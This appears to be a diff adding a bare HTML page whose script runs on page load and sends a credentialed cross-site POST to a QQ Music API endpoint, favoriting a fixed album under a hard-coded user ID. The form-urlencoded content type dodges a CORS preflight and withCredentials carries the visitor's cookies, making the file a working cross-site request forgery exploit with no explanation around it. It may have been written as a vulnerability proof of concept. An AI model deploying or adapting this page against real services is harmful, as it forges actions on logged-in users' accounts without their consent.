@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<meta charset="utf-8">
+<head>
+    <title>自动提交JSON请求</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            var url = 'https://u.y.qq.com/cgi-bin/musicu.fcg';  // 替换为您要提交JSON请求的目标URL
+
+            var data = {"req_1":{"method":"FavAlbum","module":"music.musicasset.AlbumFavWrite","param":{"uin":"2237395980","v_albumMid":["000xy2iX01wvL1"]}}};
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');  // 假设目标服务器接受JSON格式的数据
+	    xhr.withCredentials = true; // 允许携带Cookie
+
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log('JSON请求提交成功');
+                    } else {
+                        console.log('JSON请求提交失败');
+                    }
+                }
+            };
+
+            xhr.send(JSON.stringify(data));
+        }
+    </script>
+</head>
+<body>
+   
+</body>
+</html>
